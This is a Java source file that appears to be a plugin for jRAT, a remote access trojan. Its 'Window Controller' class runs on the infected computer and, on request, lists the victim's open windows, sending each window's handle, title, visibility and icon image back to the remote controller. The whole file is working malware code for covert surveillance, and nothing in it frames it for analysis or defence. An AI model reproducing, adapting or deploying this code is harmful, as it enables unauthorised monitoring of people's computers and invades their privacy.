package jrat.plugin.window.stub;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.ArrayList;
import java.util.List;

import javax.imageio.ImageIO;
import javax.swing.Icon;
import javax.swing.ImageIcon;

import jrat.api.stub.StubPlugin;
import nativewindowlib.NativeWindow;
import nativewindowlib.WindowUtils;

public class WindowPlugin extends StubPlugin {
	
	public static final short HEADER_LIST = -127;
	
	private DataInputStream dis;
	private DataOutputStream dos;

	@Override
	public void onEnable() throws Exception {
		
	}

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		this.dis = dis;
		this.dos = dos;
	}

	@Override
	public void onPacket(short header) throws Exception {
		if (header == HEADER_LIST) {
			dos.writeShort(HEADER_LIST);
			
			List<NativeWindow> windows = WindowUtils.getWindows();
			List<NativeWindow> sendWindows = new ArrayList<NativeWindow>();
			
			for (NativeWindow window : windows) {
				if (!window.isVisible() || window.isVisible() && window.getTitle().length() > 0) {
					sendWindows.add(window);
				}
			}
			
			dos.writeInt(sendWindows.size());
			
			for (int i = 0; i < sendWindows.size(); i++) {
				NativeWindow window = sendWindows.get(i);
				
				dos.writeInt(window.getHandle());
				writeString(window.getTitle());
				dos.writeBoolean(window.isVisible());

				Icon icon = window.getIcon();
				
				boolean writeIcon = window.getTitle().trim().length() > 0 && window.isVisible() && icon != null;
				
				dos.writeBoolean(writeIcon);
				if (writeIcon) {
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					
					ImageIO.write((BufferedImage) ((ImageIcon) window.getIcon()).getImage(), "png", baos);
					
					byte[] image = baos.toByteArray();
					dos.writeInt(image.length);
					dos.write(image);
				}
			}
		}
	}
	
	@Override
	public String getName() {
		return "Window Controller";
	}
	
	private void writeString(String s) throws Exception {
		if (dos != null) {
			dos.writeShort(s.length());
			dos.writeChars(s);
		}
	}

}
